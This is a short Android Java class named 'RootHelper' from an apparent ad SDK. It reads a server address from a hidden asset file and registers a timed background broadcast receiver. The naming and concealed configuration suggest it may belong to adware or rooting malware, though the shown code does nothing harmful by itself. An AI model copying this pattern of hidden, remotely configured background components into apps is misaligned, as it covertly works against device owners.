package com.parker.adsdk;

import android.content.Context;
import android.content.IntentFilter;

import com.parker.adsdk.network.RequestUtil;
import com.parker.adsdk.work.WorkAlarmBroadcastReceiver;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

/**
 * Created by parker on 2016/8/9.
 */
public class RootHelper {
    public static boolean DEBUG;
    private Context context;
    public static StringBuilder log;

    static {
        RootHelper.DEBUG = true;
    }

    private void checkTid(){
        //RequestUtil.feedback(this.context, 51, null);
    }



    public void start(Context context) throws Exception {
        Constants.url = "http://" + new JSONObject(new BufferedReader(new InputStreamReader(context.
                getAssets().open("cfg"), "UTF-8")).readLine()).getString("a");
        new URL(Constants.url);
        this.context = context;
        RootHelper.log = new StringBuilder();
        context.registerReceiver(new WorkAlarmBroadcastReceiver(), new IntentFilter("com.admonet.helper.timing.work.start"));
        this.checkTid();
    }
}
